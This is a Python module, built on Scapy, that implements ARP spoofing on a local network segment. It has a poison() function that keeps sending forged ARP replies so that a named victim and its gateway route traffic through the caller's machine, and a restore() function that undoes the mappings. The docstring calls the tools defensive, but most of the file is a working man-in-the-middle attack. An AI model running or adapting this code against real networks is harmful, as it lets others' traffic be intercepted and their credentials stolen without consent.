from __future__ import annotations

"""ARP spoofing utilities.

These are intentionally *local* (single L2 segment) helpers built on Scapy.
They are designed to support defensive response actions:

- poison(): begin ARP cache poisoning between a target and a gateway
- restore(): send corrective ARP replies to restore normal mappings

NOTE: These functions require CAP_NET_RAW (typically root) and will only work
on the same broadcast domain.
"""

import ipaddress
import threading
import time
from dataclasses import dataclass
from typing import Optional


@dataclass
class ArpPoisonSession:
    """Handle for a running ARP poison loop."""

    target_ip: str
    gateway_ip: str
    iface: str
    interval: float
    stop_event: threading.Event
    thread: threading.Thread

    def stop(self, *, restore_network: bool = True) -> None:
        self.stop_event.set()
        self.thread.join(timeout=5)
        if restore_network:
            restore(self.target_ip, self.gateway_ip, iface=self.iface)


def _validate_ipv4(ip: str) -> None:
    obj = ipaddress.ip_address(ip)
    if not isinstance(obj, ipaddress.IPv4Address):
        raise ValueError("Only IPv4 is supported")


def _resolve_mac(ip: str, iface: str, timeout_s: float = 2.0, retries: int = 2) -> str:
    """Resolve a MAC address using ARP who-has."""

    from scapy.all import ARP, Ether, conf, srp  # type: ignore[import-untyped]

    _validate_ipv4(ip)

    if retries < 1 or retries > 10:
        raise ValueError("retries must be between 1 and 10")

    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface,
        timeout=timeout_s,
        retry=retries,
        verbose=False,
    )

    for _, recv in ans:
        if recv and recv.haslayer(ARP):
            mac = str(recv[ARP].hwsrc).lower()
            if mac:
                return mac

    raise RuntimeError(f"Unable to resolve MAC for {ip} on {iface}")


def _default_iface_for_ip(ip: str) -> str:
    from scapy.all import conf  # type: ignore[import-untyped]

    _validate_ipv4(ip)

    route = conf.route.route(ip)
    if route and len(route) >= 3 and route[2]:
        return str(route[2])
    raise RuntimeError("Unable to determine default interface")


def poison(
    target_ip: str,
    gateway_ip: str,
    iface: Optional[str] = None,
    interval: float = 2.0,
) -> ArpPoisonSession:
    """Start ARP poisoning between target and gateway.

    Parameters
    ----------
    target_ip:
        Victim host IP.
    gateway_ip:
        Default gateway IP.
    iface:
        Network interface (defaults to Scapy route lookup).
    interval:
        Seconds between poison packets.

    Returns
    -------
    ArpPoisonSession
        Call .stop() to stop poisoning (optionally restoring correct ARP).
    """

    from scapy.all import ARP, get_if_hwaddr, send  # type: ignore[import-untyped]

    _validate_ipv4(target_ip)
    _validate_ipv4(gateway_ip)

    if interval < 0.2 or interval > 30:
        raise ValueError("interval must be between 0.2 and 30 seconds")

    iface = iface or _default_iface_for_ip(gateway_ip)

    attacker_mac = get_if_hwaddr(iface).lower()
    target_mac = _resolve_mac(target_ip, iface)
    gateway_mac = _resolve_mac(gateway_ip, iface)

    # Tell target: gateway is at attacker_mac
    to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=attacker_mac)
    # Tell gateway: target is at attacker_mac
    to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)

    stop_event = threading.Event()

    def _loop() -> None:
        while not stop_event.is_set():
            send(to_target, iface=iface, verbose=False)
            send(to_gateway, iface=iface, verbose=False)
            stop_event.wait(interval)

    thread = threading.Thread(target=_loop, daemon=True)
    thread.start()

    return ArpPoisonSession(
        target_ip=target_ip,
        gateway_ip=gateway_ip,
        iface=iface,
        interval=interval,
        stop_event=stop_event,
        thread=thread,
    )


def restore(
    target_ip: str,
    gateway_ip: str,
    iface: Optional[str] = None,
    count: int = 5,
) -> None:
    """Send corrective ARP replies to restore normal target<->gateway mappings."""

    from scapy.all import ARP, send  # type: ignore[import-untyped]

    _validate_ipv4(target_ip)
    _validate_ipv4(gateway_ip)

    if count < 1 or count > 50:
        raise ValueError("count must be between 1 and 50")

    iface = iface or _default_iface_for_ip(gateway_ip)

    target_mac = _resolve_mac(target_ip, iface)
    gateway_mac = _resolve_mac(gateway_ip, iface)

    # Correct mapping: gateway_ip is at gateway_mac
    fix_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac)
    # Correct mapping: target_ip is at target_mac
    fix_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac)

    for _ in range(count):
        send(fix_target, iface=iface, verbose=False)
        send(fix_gateway, iface=iface, verbose=False)
        time.sleep(0.2)
